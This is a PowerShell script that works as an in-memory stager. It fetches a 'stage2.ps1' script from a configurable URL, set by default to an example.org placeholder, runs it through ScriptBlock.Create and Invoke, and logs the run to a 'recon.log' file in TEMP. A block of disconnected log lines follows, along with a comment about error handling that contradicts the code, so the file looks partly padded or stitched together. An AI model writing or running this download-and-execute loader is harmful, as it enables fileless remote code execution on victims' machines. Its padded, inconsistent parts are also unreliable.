
[CmdletBinding()]
param(
    [string]$DownloadUrl = "https://example.org/stage2.ps1",
    [string]$ActivityLog = "$env:TEMP\recon.log",
    [int]$StageTimeout = 30
)
$ErrorActionPreference = "Stop"

function Get-StageScriptText {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 30
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

function Invoke-Stage2Script {
    param(
        [string]$ScriptBody = ""
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

Write-Verbose "Starting in-memory stage"
$PayloadText = Get-StageScriptText -SourceUrl $DownloadUrl -TimeoutSec $StageTimeout
$FetchResult = Invoke-Stage2Script -ScriptBody $PayloadText
Write-Verbose "Stage result: $($FetchResult)"

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $DownloadUrl
    ScriptLength = $PayloadText.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Starting workflow"
Write-Verbose "Validating result"
Write-Verbose "Reading configuration values"
Write-Verbose "Operation completed"
Write-Verbose "Preparing working directory"
Write-Verbose "Resolving configured target"
Write-Verbose "Collecting host metadata"
Write-Verbose "Retry budget remaining"
Write-Output "stage 12 initialized"
Set-Location -Path $env:TEMP

# Operational notes
# Errors are surfaced as warnings instead of terminating the flow.
# The launcher uses the default shell host.
# All paths are resolved relative to the current user context.
